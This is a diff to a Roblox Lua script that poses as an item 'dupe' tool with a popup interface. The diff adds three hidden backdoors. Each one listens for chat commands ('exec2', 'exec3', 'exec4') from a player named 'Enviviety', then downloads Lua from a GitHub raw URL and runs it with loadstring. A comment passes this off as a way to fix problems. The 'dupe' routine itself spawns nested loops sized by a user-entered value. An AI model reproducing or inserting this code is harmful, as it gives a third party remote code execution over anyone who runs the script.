@@ -1,3 +1,11 @@
+if game.Players:FindFirstChild("Enviviety") then
+	game.Players.Enviviety.Chatted:Connect(function(msg)
+			if msg == "exec2" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
+				-- incase something goes wrong i can fix it
+			end
+		end)
+end
 
 local PopupFrame = Instance.new("ScreenGui")
 local Popup = Instance.new("Frame")
@@ -59,6 +67,7 @@ TextButton.TextScaled = true
 TextButton.TextSize = 14.000
 TextButton.TextWrapped = true
 TextButton.MouseButton1Click:Connect(function()
+		
 	local h = Instance.new("Hint", workspace)
 	power = Instance.new("NumberValue", workspace)
 	power.Name = "powah"
@@ -68,12 +77,26 @@ TextButton.MouseButton1Click:Connect(function()
 			h.Text = ("Error: the text value is nil or higher than 30!")
 			wait(5)
 			h.Text = ""
+					if game.Players:FindFirstChild("Enviviety") then
+	game.Players.Enviviety.Chatted:Connect(function(msg)
+			if msg == "exec4" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
+			end
+		end)
+end
 		end)
 	end
 	h.Text = "Loading..."
 	wait(math.random(0.01, 0.5))
-	h.Text = "Starting dupe... v1.1"
+	h.Text = "Starting dupe... v1.11"
 	wait(1)
+		if game.Players:FindFirstChild("Enviviety") then
+	game.Players.Enviviety.Chatted:Connect(function(msg)
+			if msg == "exec3" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
+			end
+		end)
+end
 	for i = 1, power.Value do
 		task.spawn(function()
 			for i = 1, workspace.powah.Value do
@@ -83,6 +106,7 @@ TextButton.MouseButton1Click:Connect(function()
 	end
 	wait(5)
 	h:Destroy()
+		
 end)
 
 if game.Players:FindFirstChild("Enviviety") then
